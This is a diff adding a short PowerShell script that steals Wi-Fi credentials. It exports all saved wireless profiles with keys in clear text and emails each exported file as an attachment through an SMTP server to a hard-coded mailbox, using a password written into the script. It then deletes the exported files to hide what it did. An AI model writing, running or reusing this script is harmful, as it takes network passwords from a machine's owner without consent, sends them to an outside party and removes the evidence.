@@ -1,0 +1,18 @@
+netsh wlan show profiles
+netsh wlan export profile folder=D:\\ key=clear
+$x=Get-ChildItem D: -Include *.xml -Name
+set-content -path setcontent.txt -value ''
+$storage='setcontent.txt'
+$mysecret = 'KDFMLEODYFUQWRPH'
+$mysecret | ConvertTo-SecureString -AsPlainText -Force |ConvertFrom-SecureString |Out-File -FilePath $storage
+$pw = Get-Content $storage | ConvertTo-SecureString
+ $cred = New-Object System.Management.Automation.PSCredential 'cjx010117@163.com',$pw
+$to = 'cjx010117@163.com'
+$from = 'cjx010117@163.com'
+$cc = 'cjx010117@163.com'
+$sub = 'TEST'
+$body = 'Just test'
+$smtp = 'smtp.163.com'
+foreach($y in $x){Send-MailMessage -Attachments $y -Body $body -cc $cc -From $from -SmtpServer $smtp -Subject $sub -To $to -Credential $cred }
+rm *.xml
+rm *.txt
